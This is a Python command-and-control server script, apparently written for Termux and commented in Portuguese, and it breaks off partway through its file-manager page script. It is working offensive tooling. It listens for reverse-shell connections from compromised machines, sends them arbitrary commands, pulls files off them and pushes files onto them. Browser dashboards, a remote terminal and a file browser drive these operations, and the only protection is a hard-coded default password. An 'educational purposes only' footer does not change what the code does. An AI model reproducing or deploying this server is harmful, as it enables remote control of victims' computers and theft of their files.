#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import socket
import threading
import subprocess
import hashlib
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import mimetypes

# ==================== CONFIGURAÇÃO ====================
CONFIG_FILE = "c2_config.json"
DEFAULT_CONFIG = {
    "server_port": 8080,
    "shell_port": 4444,
    "upload_dir": "uploads",
    "download_dir": "downloads",
    "password": "admin123",
    "auto_start": True,
    "tunnel_enabled": False,
    "tunnel_type": "localhost"
}

class C2Server:
    def __init__(self):
        self.config = self.load_config()
        self.clients = {}
        self.server_socket = None
        self.web_server = None
        self.setup_directories()
        
    def load_config(self):
        """Carrega configuração do arquivo"""
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            self.save_config(DEFAULT_CONFIG)
            return DEFAULT_CONFIG.copy()
    
    def save_config(self, config=None):
        """Salva configuração no arquivo"""
        if config is None:
            config = self.config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    
    def setup_directories(self):
        """Cria diretórios necessários"""
        dirs = [
            self.config['upload_dir'],
            self.config['download_dir']
        ]
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)
    
    def start_shell_listener(self):
        """Inicia listener para shells reversas"""
        def listener_thread():
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', self.config['shell_port']))
                self.server_socket.listen(5)
                
                print(f"[+] Shell listener started on port {self.config['shell_port']}")
                
                while True:
                    client_socket, client_address = self.server_socket.accept()
                    client_id = f"{client_address[0]}:{client_address[1]}"
                    
                    print(f"[+] New connection from {client_id}")
                    
                    # Adicionar cliente à lista
                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': client_address,
                        'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'os': 'unknown',
                        'user': 'unknown'
                    }
                    
                    # Thread para lidar com o cliente
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_id)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
            except Exception as e:
                print(f"[-] Error in shell listener: {e}")
        
        thread = threading.Thread(target=listener_thread)
        thread.daemon = True
        thread.start()
    
    def handle_client(self, client_socket, client_id):
        """Lida com comunicação do cliente"""
        try:
            # Receber informações do sistema
            client_socket.send(b"system_info\n")
            system_info = client_socket.recv(1024).decode().strip()
            
            if ':' in system_info:
                os_info, user_info = system_info.split(':', 1)
                self.clients[client_id]['os'] = os_info
                self.clients[client_id]['user'] = user_info
            
            while True:
                # Manter conexão viva
                self.clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                time.sleep(10)
                
        except Exception as e:
            print(f"[-] Client {client_id} disconnected: {e}")
            if client_id in self.clients:
                del self.clients[client_id]
    
    def send_command(self, client_id, command):
        """Envia comando para cliente específico"""
        if client_id not in self.clients:
            return "Client not found"
        
        try:
            client_socket = self.clients[client_id]['socket']
            client_socket.send(command.encode() + b"\n")
            
            # Receber resposta
            response = b""
            client_socket.settimeout(5.0)
            
            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_file_list(self, client_id, path="."):
        """Obtém lista de arquivos do cliente"""
        command = f"list_files {path}"
        return self.send_command(client_id, command)
    
    def download_file(self, client_id, remote_path, local_filename):
        """Faz download de arquivo do cliente"""
        try:
            command = f"download_file {remote_path}"
            response = self.send_command(client_id, command)
            
            if response.startswith("FILE_CONTENT:"):
                # Extrair conteúdo do arquivo
                file_data = base64.b64decode(response.split(":", 1)[1])
                
                # Salvar localmente
                local_path = os.path.join(self.config['download_dir'], local_filename)
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                
                return f"File downloaded: {local_path}"
            else:
                return f"Error: {response}"
                
        except Exception as e:
            return f"Download error: {str(e)}"
    
    def upload_file(self, client_id, local_path, remote_path):
        """Faz upload de arquivo para o cliente"""
        try:
            if not os.path.exists(local_path):
                return "Local file not found"
            
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            command = f"upload_file {remote_path} {file_data}"
            response = self.send_command(client_id, command)
            
            return response
            
        except Exception as e:
            return f"Upload error: {str(e)}"
    
    def generate_html_template(self, template_name, additional_data=None):
        """Gera templates HTML dinamicamente"""
        templates = {
            'index': self.generate_index_html(),
            'dashboard': self.generate_dashboard_html(),
            'terminal': self.generate_terminal_html(),
            'files': self.generate_files_html(),
            'upload': self.generate_upload_html(),
            'settings': self.generate_settings_html()
        }
        
        return templates.get(template_name, "<h1>Template not found</h1>")
    
    def generate_index_html(self):
        """Gera HTML da página inicial"""
        return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Server - Command & Control</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        :root {{
            --primary: #2196F3;
            --secondary: #1976D2;
            --accent: #FF4081;
            --dark: #263238;
            --light: #ECEFF1;
            --success: #4CAF50;
            --warning: #FF9800;
            --danger: #F44336;
        }}

        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}

        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }}

        header {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 0 0 15px 15px;
        }}

        .logo {{
            text-align: center;
            color: white;
        }}

        .logo h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}

        nav {{
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }}

        .nav-btn {{
            background: var(--primary);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
        }}

        .nav-btn:hover {{
            background: var(--secondary);
            transform: translateY(-2px);
        }}

        .hero {{
            text-align: center;
            padding: 60px 20px;
        }}

        .hero-content h2 {{
            font-size: 2.5em;
            margin-bottom: 20px;
            color: white;
        }}

        .hero-content p {{
            font-size: 1.2em;
            margin-bottom: 40px;
            color: rgba(255,255,255,0.8);
        }}

        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }}

        .stat-card {{
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            text-align: center;
            backdrop-filter: blur(10px);
        }}

        .stat-card h3 {{
            font-size: 2em;
            color: var(--primary);
            margin-bottom: 10px;
        }}

        .cta-btn {{
            background: var(--accent);
            color: white;
            padding: 15px 30px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: bold;
            font-size: 1.1em;
            transition: all 0.3s;
            display: inline-block;
            margin-top: 20px;
        }}

        .cta-btn:hover {{
            background: #E91E63;
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }}

        footer {{
            text-align: center;
            color: rgba(255,255,255,0.7);
            padding: 20px 0;
            margin-top: 50px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>🕸️ C2 Server</h1>
                <p>Command & Control Center</p>
            </div>
            <nav>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/terminal" class="nav-btn">Terminal</a>
                <a href="/files" class="nav-btn">Files</a>
                <a href="/upload" class="nav-btn">Upload</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <main class="hero">
            <div class="hero-content">
                <h2>Welcome to C2 Server</h2>
                <p>Advanced Command and Control Platform</p>
                <div class="stats-grid">
                    <div class="stat-card">
                        <h3 id="clients-count">0</h3>
                        <p>Clients Online</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="shell-port">{self.config['shell_port']}</h3>
                        <p>Shell Port</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="web-port">{self.config['server_port']}</h3>
                        <p>Web Port</p>
                    </div>
                </div>
                <a href="/dashboard" class="cta-btn">Go to Dashboard</a>
            </div>
        </main>

        <footer>
            <p>&copy; 2024 C2 Server - For Educational Purposes Only</p>
        </footer>
    </div>

    <script>
        // Atualizar contador de clientes
        function updateClientCount() {{
            fetch('/api/clients')
                .then(response => response.json())
                .then(data => {{
                    document.getElementById('clients-count').textContent = data.length;
                }})
                .catch(error => console.error('Error:', error));
        }}

        // Atualizar a cada 5 segundos
        setInterval(updateClientCount, 5000);
        updateClientCount();
    </script>
</body>
</html>
"""
    
    def generate_dashboard_html(self):
        """Gera HTML do dashboard"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - C2 Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2196F3;
            --secondary: #1976D2;
            --accent: #FF4081;
            --dark: #263238;
            --light: #ECEFF1;
            --success: #4CAF50;
            --warning: #FF9800;
            --danger: #F44336;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 0 0 15px 15px;
        }

        .logo {
            text-align: center;
            color: white;
        }

        .logo h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }

        nav {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }

        .nav-btn {
            background: var(--primary);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--secondary);
            transform: translateY(-2px);
        }

        main {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .dashboard {
            display: grid;
            gap: 30px;
        }

        .clients-panel, .quick-actions, .system-info {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .clients-panel h2, .quick-actions h2, .system-info h2 {
            color: var(--dark);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .clients-list {
            max-height: 400px;
            overflow-y: auto;
        }

        .client-item {
            background: var(--light);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 4px solid var(--success);
        }

        .client-info {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
        }

        .client-id {
            font-weight: bold;
            color: var(--primary);
        }

        .client-os {
            color: var(--dark);
        }

        .client-user {
            color: #666;
        }

        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
        }

        .action-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 500;
        }

        .action-btn:hover {
            background: var(--secondary);
            transform: translateY(-2px);
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }

        .info-item {
            background: var(--light);
            padding: 15px;
            border-radius: 8px;
        }

        .info-item strong {
            color: var(--dark);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>📊 Dashboard</h1>
            </div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/terminal" class="nav-btn">Terminal</a>
                <a href="/files" class="nav-btn">Files</a>
                <a href="/upload" class="nav-btn">Upload</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <main>
            <div class="dashboard">
                <div class="clients-panel">
                    <h2>🖥️ Connected Clients</h2>
                    <div id="clients-list" class="clients-list">
                        <!-- Clients will be loaded here -->
                    </div>
                </div>

                <div class="quick-actions">
                    <h2>⚡ Quick Actions</h2>
                    <div class="actions-grid">
                        <button class="action-btn" onclick="sendQuickCommand('system_info')">
                            System Info
                        </button>
                        <button class="action-btn" onclick="sendQuickCommand('whoami')">
                            Who Am I
                        </button>
                        <button class="action-btn" onclick="sendQuickCommand('pwd')">
                            Current Directory
                        </button>
                        <button class="action-btn" onclick="sendQuickCommand('ls -la')">
                            List Files
                        </button>
                        <button class="action-btn" onclick="sendQuickCommand('ifconfig')">
                            Network Info
                        </button>
                        <button class="action-btn" onclick="sendQuickCommand('ps aux')">
                            Running Processes
                        </button>
                    </div>
                </div>

                <div class="system-info">
                    <h2>🔧 Server Information</h2>
                    <div class="info-grid">
                        <div class="info-item">
                            <strong>Shell Port:</strong> <span id="info-shell-port">4444</span>
                        </div>
                        <div class="info-item">
                            <strong>Web Port:</strong> <span id="info-web-port">8080</span>
                        </div>
                        <div class="info-item">
                            <strong>Uptime:</strong> <span id="info-uptime">0s</span>
                        </div>
                        <div class="info-item">
                            <strong>Active Clients:</strong> <span id="info-active-clients">0</span>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        let selectedClient = null;

        // Carregar lista de clientes
        function loadClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const clientsList = document.getElementById('clients-list');
                    clientsList.innerHTML = '';

                    if (clients.length === 0) {
                        clientsList.innerHTML = '<div class="client-item">No clients connected</div>';
                        return;
                    }

                    clients.forEach(client => {
                        const clientDiv = document.createElement('div');
                        clientDiv.className = 'client-item';
                        clientDiv.innerHTML = `
                            <div class="client-info">
                                <div class="client-id">${client.id}</div>
                                <div class="client-os">${client.os}</div>
                                <div class="client-user">${client.user}</div>
                            </div>
                            <div style="margin-top: 10px; font-size: 0.9em; color: #666;">
                                Connected: ${client.connected_at}
                            </div>
                        `;
                        clientDiv.onclick = () => selectClient(client.id);
                        clientsList.appendChild(clientDiv);
                    });

                    document.getElementById('info-active-clients').textContent = clients.length;
                })
                .catch(error => console.error('Error:', error));
        }

        function selectClient(clientId) {
            selectedClient = clientId;
            // Destacar cliente selecionado
            document.querySelectorAll('.client-item').forEach(item => {
                item.style.borderLeftColor = item.textContent.includes(clientId) ? '#FF4081' : '#4CAF50';
            });
        }

        function sendQuickCommand(command) {
            if (!selectedClient) {
                alert('Please select a client first');
                return;
            }

            fetch(`/api/command?client_id=${selectedClient}&command=${encodeURIComponent(command)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('Command sent successfully!\\nResult: ' + data.result);
                    } else {
                        alert('Error: ' + data.error);
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        // Atualizar a cada 3 segundos
        setInterval(loadClients, 3000);
        loadClients();

        // Atualizar uptime
        let startTime = Date.now();
        setInterval(() => {
            const uptime = Math.floor((Date.now() - startTime) / 1000);
            document.getElementById('info-uptime').textContent = uptime + 's';
        }, 1000);
    </script>
</body>
</html>
"""
    
    def generate_terminal_html(self):
        """Gera HTML do terminal"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal - C2 Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2196F3;
            --secondary: #1976D2;
            --accent: #FF4081;
            --dark: #263238;
            --light: #ECEFF1;
            --success: #4CAF50;
            --warning: #FF9800;
            --danger: #F44336;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 0 0 15px 15px;
        }

        .logo {
            text-align: center;
            color: white;
        }

        .logo h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }

        nav {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }

        .nav-btn {
            background: var(--primary);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--secondary);
            transform: translateY(-2px);
        }

        main {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .terminal-container {
            background: #1e1e1e;
            border-radius: 10px;
            overflow: hidden;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }

        .terminal-header {
            background: #2d2d2d;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #444;
        }

        .terminal-header h3 {
            color: #fff;
            margin: 0;
        }

        .client-selector {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .client-selector select {
            background: #444;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 5px;
        }

        .status-online {
            color: var(--success);
            font-weight: bold;
        }

        .status-offline {
            color: var(--danger);
            font-weight: bold;
        }

        .terminal-output {
            height: 400px;
            overflow-y: auto;
            padding: 20px;
            background: #1e1e1e;
        }

        .terminal-input {
            display: flex;
            background: #2d2d2d;
            padding: 15px 20px;
            border-top: 1px solid #444;
        }

        .terminal-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }

        .terminal-input button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 10px;
        }

        .terminal-input button:disabled {
            background: #666;
            cursor: not-allowed;
        }

        .quick-commands {
            background: #2d2d2d;
            padding: 15px 20px;
            border-top: 1px solid #444;
        }

        .quick-commands h4 {
            color: #fff;
            margin-bottom: 10px;
        }

        .quick-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .quick-btn {
            background: #444;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }

        .quick-btn:hover {
            background: #555;
        }

        .command-line {
            margin-bottom: 5px;
        }

        .prompt {
            color: #00ffff;
        }

        .output {
            color: #00ff00;
            white-space: pre-wrap;
        }

        .welcome-message {
            text-align: center;
            color: #888;
            padding: 50px 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>💻 Terminal</h1>
            </div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/files" class="nav-btn">Files</a>
                <a href="/upload" class="nav-btn">Upload</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <main>
            <div class="terminal-container">
                <div class="terminal-header">
                    <h3>Remote Terminal</h3>
                    <div class="client-selector">
                        <select id="client-select">
                            <option value="">Select Client...</option>
                        </select>
                        <span id="client-status" class="status-offline">Offline</span>
                    </div>
                </div>

                <div class="terminal-output" id="terminal-output">
                    <div class="welcome-message">
                        <p>Welcome to C2 Terminal</p>
                        <p>Select a client from the dropdown to start sending commands</p>
                    </div>
                </div>

                <div class="terminal-input">
                    <input type="text" id="command-input" placeholder="Enter command..." disabled>
                    <button id="send-command" disabled>Send</button>
                </div>

                <div class="quick-commands">
                    <h4>Quick Commands:</h4>
                    <div class="quick-buttons">
                        <button class="quick-btn" data-command="system_info">System Info</button>
                        <button class="quick-btn" data-command="whoami">Current User</button>
                        <button class="quick-btn" data-command="pwd">Working Directory</button>
                        <button class="quick-btn" data-command="ls -la">List Files</button>
                        <button class="quick-btn" data-command="ifconfig || ip addr">Network</button>
                        <button class="quick-btn" data-command="ps aux">Processes</button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        let currentClient = null;

        // Carregar clientes no dropdown
        function loadClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const select = document.getElementById('client-select');
                    select.innerHTML = '<option value="">Select Client...</option>';
                    
                    clients.forEach(client => {
                        const option = document.createElement('option');
                        option.value = client.id;
                        option.textContent = `${client.id} (${client.os} - ${client.user})`;
                        select.appendChild(option);
                    });

                    // Atualizar status
                    const status = document.getElementById('client-status');
                    if (clients.length > 0) {
                        status.textContent = `${clients.length} Online`;
                        status.className = 'status-online';
                    } else {
                        status.textContent = 'Offline';
                        status.className = 'status-offline';
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        // Selecionar cliente
        document.getElementById('client-select').addEventListener('change', function() {
            currentClient = this.value;
            const commandInput = document.getElementById('command-input');
            const sendButton = document.getElementById('send-command');
            
            if (currentClient) {
                commandInput.disabled = false;
                sendButton.disabled = false;
                addToTerminal(`Connected to: ${currentClient}`, 'system');
            } else {
                commandInput.disabled = true;
                sendButton.disabled = true;
            }
        });

        // Enviar comando
        document.getElementById('send-command').addEventListener('click', sendCommand);
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendCommand();
            }
        });

        // Comandos rápidos
        document.querySelectorAll('.quick-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                if (!currentClient) {
                    alert('Please select a client first');
                    return;
                }
                const command = this.getAttribute('data-command');
                document.getElementById('command-input').value = command;
                sendCommand();
            });
        });

        function sendCommand() {
            const commandInput = document.getElementById('command-input');
            const command = commandInput.value.trim();
            
            if (!command || !currentClient) return;

            addToTerminal(`$ ${command}`, 'command');
            commandInput.value = '';

            fetch(`/api/command?client_id=${currentClient}&command=${encodeURIComponent(command)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        addToTerminal(data.result, 'output');
                    } else {
                        addToTerminal(`Error: ${data.error}`, 'error');
                    }
                })
                .catch(error => {
                    addToTerminal(`Network error: ${error}`, 'error');
                });
        }

        function addToTerminal(text, type = 'output') {
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = 'command-line';
            
            if (type === 'command') {
                line.innerHTML = `<span class="prompt">$</span> ${text}`;
            } else if (type === 'error') {
                line.innerHTML = `<span style="color: #ff4444">${text}</span>`;
            } else if (type === 'system') {
                line.innerHTML = `<span style="color: #ffff00">${text}</span>`;
            } else {
                line.innerHTML = `<span class="output">${text}</span>`;
            }
            
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }

        // Atualizar clientes a cada 3 segundos
        setInterval(loadClients, 3000);
        loadClients();
    </script>
</body>
</html>
"""
    
    def generate_files_html(self):
        """Gera HTML do gerenciador de arquivos"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager - C2 Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2196F3;
            --secondary: #1976D2;
            --accent: #FF4081;
            --dark: #263238;
            --light: #ECEFF1;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 0 0 15px 15px;
        }

        .logo {
            text-align: center;
            color: white;
        }

        .logo h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }

        nav {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }

        .nav-btn {
            background: var(--primary);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--secondary);
            transform: translateY(-2px);
        }

        main {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .file-manager {
            display: grid;
            gap: 30px;
        }

        .client-selector {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .client-selector h3 {
            margin-bottom: 15px;
            color: var(--dark);
        }

        .client-selector select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .file-browser {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .file-toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .file-toolbar button, .file-toolbar input {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .file-toolbar button {
            background: var(--primary);
            color: white;
            border: none;
            cursor: pointer;
        }

        .file-toolbar button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .file-toolbar input {
            flex: 1;
            min-width: 200px;
        }

        .file-list {
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 10px;
        }

        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
        }

        .file-item:hover {
            background: #f5f5f5;
        }

        .file-item.selected {
            background: var(--light);
            border-left: 3px solid var(--primary);
        }

        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .file-icon {
            font-size: 1.2em;
        }

        .downloads-section {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .downloads-list {
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 10px;
            margin-top: 10px;
        }

        .download-item {
            padding: 8px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
        }

        .no-client, .no-files {
            text-align: center;
            color: #666;
            padding: 40px 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>📁 File Manager</h1>
            </div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/terminal" class="nav-btn">Terminal</a>
                <a href="/upload" class="nav-btn">Upload</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <main>
            <div class="file-manager">
                <div class="client-selector">
                    <h3>Select Client:</h3>
                    <select id="files-client-select">
                        <option value="">Select Client...</option>
                    </select>
                </div>

                <div class="file-browser">
                    <div class="file-toolbar">
                        <button id="refresh-files" disabled>Refresh</button>
                        <button id="download-file" disabled>Download</button>
                        <input type="text" id="file-path" placeholder="/path/to/directory" value=".">
                        <button id="go-path">Go</button>
                    </div>

                    <div class="file-list" id="file-list">
                        <div class="no-client">
                            <p>Please select a client to browse files</p>
                        </div>
                    </div>
                </div>

                <div class="downloads-section">
                    <h3>📥 Local Downloads</h3>
                    <div class="downloads-list" id="downloads-list">
                        <!-- Local files will be listed here -->
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        let selectedClient = null;
        let selectedFile = null;
        let currentPath = '.';

        // Carregar clientes
        function loadClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const select = document.getElementById('files-client-select');
                    select.innerHTML = '<option value="">Select Client...</option>';
                    
                    clients.forEach(client => {
                        const option = document.createElement('option');
                        option.value = client.id;
                        option.textContent = `${client.id} (${client.os})`;
                        select.appendChild(option);
                    });
                })
                .catch(error => console.error('Error:', error));
        }

        // Selecionar cliente
        document.getElementById('files-client-select').addEventListener('change', function() {
            selectedClient = this.value;
            const refreshBtn = document.getElementById('refresh-files');
            const downloadBtn = document.getElementById('download-file');
            
            if (selectedClient) {
                refreshBtn.disabled = false;
                downloadBtn.disabled = false;
                loadFiles('.');
            } else {
                refreshBtn.disabled = true;
                downloadBtn.disabled = true;
                document.getElementById('file-list').innerHTML = '<div class="no-client">Please select a client to browse files</div>';
            }
        });

        // Carregar arquivos
        function loadFiles(path) {
            if (!selectedClient) return;
            
            currentPath = path;
            document.getElementById('file-path').value = path;

            fetch(`/api/files?client_id=${selectedClient}&path=${encodeURIComponent(path)}`)
                .then(response => response.json())
                .then(data => {
                    const fileList = document.getElementById('file-list');
                    
                    if (data.success) {
                        fileList.innerHTML = '';
                        
                        if (path !== '.') {
                            // Botão para voltar
                            const backItem = document.createElement('div');
                            backItem.className = 'file-item';
                            backItem.innerHTML = `
                                <div class="file-name">
                                    <span class="file-icon">📁</span>
                                    <span>.. (parent directory)</span>
                                </div>
                            `;
                            backItem.onclick = () => {
                                const parentPath = path.split('/').slice(0, -1).join('/') || '.';
                                loadFiles(parentPath);
                            };
                            fileList.appendChild(backItem);
                        }

                        // Processar lista de arquivos
                        const files = data.files.split('\n').filter(line => line.trim());
                        
                        files.forEach(fileLine => {
